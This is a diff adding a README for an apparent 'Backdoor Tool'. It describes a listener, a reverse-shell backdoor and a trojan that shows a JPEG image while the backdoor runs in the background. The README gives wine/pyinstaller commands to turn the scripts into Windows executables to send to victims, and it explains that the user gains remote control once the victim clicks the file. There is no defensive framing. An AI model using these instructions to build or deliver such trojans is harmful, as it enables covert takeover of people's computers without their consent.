@@ -1,0 +1,29 @@
+""""Welcome to the Backdoor Tool""""
+---------------------------------------------------------------------------------------------------------------------------------------------
+This tool works on various different environments such as Windows, Linux and MacOS
+
+This tool consists of 3 programs:
+1) listener.py
+2) reverse_backdoor.py
+3) download_and_report.py
+---------------------------------------------------------------------------------------------------------------------------------------------
+listener.py
+---------------------------------------------------------------------------------------------------------------------------------------------
+This program acts like a listener to the reverse connection which is obtained once the backdoor is run successfully in the victim client's system. It functions very similar to the netcat.
+
+The user has to run the listener.py from their system waiting for the victim client to click on the .exe file sent to them and then once the backdoor executes succcessfully, the user gets the remote control of the victim's machine.
+Ex: python listener.py
+---------------------------------------------------------------------------------------------------------------------------------------------
+reverse_backdoor.py
+---------------------------------------------------------------------------------------------------------------------------------------------
+This program should be first converted by the user and then sent to the victim client as an executable file.This can be done as follows:
+1) wine /root/.wine/drive_c/Python27/python.exe -m pip install requests==2.5.1
+2) wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.py --onefile reverse_backdoor.py
+--------------------------------------------------------------------------------------------------------------------------------------------
+download_and_report.py
+--------------------------------------------------------------------------------------------------------------------------------------------
+This program links to the trojan object chosen(here it is a .jpeg file) and also to the "reverse_backdoor.py" program and executes perfectly as a trojan, ie, the victim will be viewing an image in the foreground but the actual malicious file will be running in the background and enables the user to gain remote control to the victim's machine.
+Command to convert it into an executable file is as follows:
+wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.py --onefile download_and_report.py
+
+
